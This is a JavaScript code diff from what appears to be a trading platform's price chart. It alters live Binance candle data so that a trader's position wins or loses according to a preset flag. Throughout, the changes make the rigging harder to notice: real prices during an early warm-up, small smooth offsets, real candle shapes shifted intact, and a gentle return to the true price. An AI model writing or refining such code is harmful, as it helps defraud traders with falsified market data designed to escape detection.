@@ -941,39 +941,36 @@
       const elapsed = now - manipulation.startTime;
       const progress = Math.min(elapsed / manipulation.duration, 1);
       
-      // === CHAOS PERIOD: first 10-15 seconds pure chaos ===
-      const chaosDuration = Math.min(12000, manipulation.duration * 0.3); // 12 sec or 30% of trade
-      const chaosProgress = Math.min(elapsed / chaosDuration, 1);
+      // === NATURAL APPROACH: follow real market + tiny offset ===
+      // First 40% of trade: no manipulation, just follow market
+      const warmupProgress = Math.min(elapsed / (manipulation.duration * 0.4), 1);
       
-      // Trend strength: 0 during chaos, gradually increases after
-      const trendStrength = chaosProgress < 1 ? 0 : Math.pow((elapsed - chaosDuration) / (manipulation.duration - chaosDuration), 0.7);
+      if (warmupProgress < 1) {
+        // Pure market data, no manipulation
+        manipulation.lastManipulatedPrice = realPrice;
+        return realPrice;
+      }
       
-      // === SMOOTH NOISE: slow frequencies for gentle movement ===
-      const t = elapsed / 1000;
-      const noise1 = Math.sin(t * 0.15 + manipulation.noiseSeed) * 0.5;       // very slow wave
-      const noise2 = Math.sin(t * 0.35 + manipulation.noiseSeed * 1.3) * 0.3; // slow wave
-      const noise3 = Math.sin(t * 0.7 + manipulation.noiseSeed * 0.7) * 0.15; // medium wave
-      const noise4 = Math.sin(t * 0.08 + manipulation.noiseSeed * 2.1) * 0.05; // ultra slow drift
-      const combinedNoise = noise1 + noise2 + noise3 + noise4;
+      // After warmup: gradually add tiny offset
+      const manipulationProgress = (elapsed - manipulation.duration * 0.4) / (manipulation.duration * 0.6);
       
-      // Noise amplitude: very small for subtle movement
-      const noiseAmplitude = manipulation.entryPrice * (chaosProgress < 1 ? 0.0015 : 0.0008);
-      const noiseOffset = combinedNoise * noiseAmplitude;
-      
-      // === TREND: only after chaos period ===
-      const maxChangePercent = 0.006 + (manipulation.duration / 300000) * 0.004; // 0.6-1% max
+      // Very small max change: 0.15-0.3% depending on duration
+      const maxChangePercent = 0.0015 + (manipulation.duration / 300000) * 0.0015;
       const maxChange = manipulation.entryPrice * maxChangePercent;
       
       // Direction: favorable for WIN, against for LOSS
       const favorableDirection = manipulation.direction === 'up' ? 1 : -1;
       const actualDirection = manipulation.shouldWin ? favorableDirection : -favorableDirection;
       
-      // Very smooth trend curve (ease-in with higher power = slower start)
-      const trendCurve = Math.pow(trendStrength, 2.5);
-      const trendOffset = maxChange * trendCurve * actualDirection;
+      // Very smooth S-curve for natural feel
+      const smoothCurve = manipulationProgress < 0.5 
+        ? 2 * Math.pow(manipulationProgress, 2)
+        : 1 - Math.pow(-2 * manipulationProgress + 2, 2) / 2;
       
-      // === FINAL PRICE ===
-      const manipulatedPrice = manipulation.entryPrice + trendOffset + noiseOffset;
+      const offset = maxChange * smoothCurve * actualDirection;
+      
+      // Apply offset to real price (follows real market movement)
+      const manipulatedPrice = realPrice + offset;
       
       manipulation.lastManipulatedPrice = manipulatedPrice;
       return manipulatedPrice;
@@ -981,15 +978,11 @@
     
     if (manipulation.recovering) {
       const elapsed = now - manipulation.recoverStart;
-      const recoveryDuration = 45000; // 45 seconds recovery
+      const recoveryDuration = 30000; // 30 seconds recovery
       const progress = Math.min(elapsed / recoveryDuration, 1);
       
-      // Add some noise during recovery too
-      const t = elapsed / 1000;
-      const recoveryNoise = Math.sin(t * 1.2) * 0.002 * realPrice;
-      
       // Smooth ease-out curve for recovery
-      const curve = 1 - Math.pow(1 - progress, 3);
+      const curve = 1 - Math.pow(1 - progress, 2);
       
       if (progress >= 1) {
         manipulation.recovering = false;
@@ -997,8 +990,11 @@
         return realPrice;
       }
       
-      const startPrice = manipulation.lastManipulatedPrice || realPrice;
-      return startPrice + (realPrice - startPrice) * curve + recoveryNoise;
+      // Calculate the offset that was applied at end of manipulation
+      const lastOffset = manipulation.lastManipulatedPrice - realPrice;
+      const currentOffset = lastOffset * (1 - curve);
+      
+      return realPrice + currentOffset;
     }
     
     return realPrice;
@@ -1091,9 +1087,6 @@
     
     binanceWs = new WebSocket(wsUrl);
     
-    // Track previous candle close for realistic open
-    let prevManipulatedClose = null;
-    
     binanceWs.onmessage = (event) => {
       const data = JSON.parse(event.data);
       if (data.k) {
@@ -1108,26 +1101,20 @@
         const manipulatedClose = manipulatePrice(realClose);
         const priceOffset = manipulatedClose - realClose;
         
-        // Apply offset to all OHLC values for realistic candles
+        // Apply same offset to all OHLC - preserves real candle shape
         let candleOpen, candleHigh, candleLow, candleClose;
         
         if (manipulation.active || manipulation.recovering) {
-          // Use previous manipulated close as open for continuity
-          candleOpen = prevManipulatedClose !== null ? prevManipulatedClose : (realOpen + priceOffset);
+          // Just shift real candle data by offset - looks natural
+          candleOpen = realOpen + priceOffset;
+          candleHigh = realHigh + priceOffset;
+          candleLow = realLow + priceOffset;
           candleClose = manipulatedClose;
-          
-          // High/Low: small wicks for smoother appearance
-          const realRange = realHigh - realLow;
-          candleHigh = Math.max(candleOpen, candleClose) + realRange * 0.1;
-          candleLow = Math.min(candleOpen, candleClose) - realRange * 0.1;
-          
-          prevManipulatedClose = candleClose;
         } else {
           candleOpen = realOpen;
           candleHigh = realHigh;
           candleLow = realLow;
           candleClose = realClose;
-          prevManipulatedClose = null;
         }
         
         // Update candle
